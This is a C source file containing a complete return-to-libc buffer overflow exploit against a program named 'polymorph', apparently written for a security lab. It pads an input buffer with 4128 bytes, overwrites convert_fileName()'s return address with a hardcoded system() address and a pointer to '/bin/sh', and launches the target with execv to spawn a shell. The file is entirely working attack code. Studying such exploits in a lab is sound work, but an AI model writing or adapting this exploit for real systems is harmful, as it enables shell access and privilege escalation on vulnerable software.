#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "polymorph_types.h"


int random_addr[1];

int main()
{
    // get system() address by GDB debugger
    void *system_addr = (void *)0xb7e42160;

    // fake convert_fileName() parameter value 
    // make sure its a valid memory address to read to avoid segfault
    // when convert_fileName uses it
    void *fake_param_addr = (void *)0x804d184;

    // export environmental variable "/bin/sh"
    putenv("sh_string=/bin/sh");

    // "/bin/sh" address will be on the stack of polymorph
    // so this is the stack address found through gdb
    void *sh_addr = (void *)0xbfffd028;

    // verify the addresses and values
    printf("system() address is %p\n", system_addr);
    printf("fake paramter address is %p\n", fake_param_addr);
    printf("address %p contains %s\n", sh_addr, (char *)sh_addr);
    
    // set up parameters for execv
    char *parameters[4];
    parameters[0] = "./polymorph";
    parameters[1] = "-f";
    parameters[3] = NULL;

    // set up the malicious buffer input
    char buffer[2 * MAX];

    // write 'a' to occupy the buffer with MAX size
    int i;
    for (i = 0; i < 4128; i++) {
        buffer[i] = 'a';
    }

    // write system() address to convert_fileName() return address position
    *(long *)&(buffer[i]) = (long) system_addr; i+=4;

    // write fake parameter address to convert_fileName() paremeter position
    *(long *)&(buffer[i]) = (long) fake_param_addr; i+=4;

    // write sh address to system() parameter position
    *(long *)&(buffer[i]) = (long) sh_addr; i+=4;

    // place "/bin/sh" at the end of the payload
    strcpy(&(buffer[i]), "/bin/sh");
    parameters[2] = buffer;
    
    // execute polymorph with malicious input
    execv("./polymorph", parameters);

    // should not get here
    return 0;
}

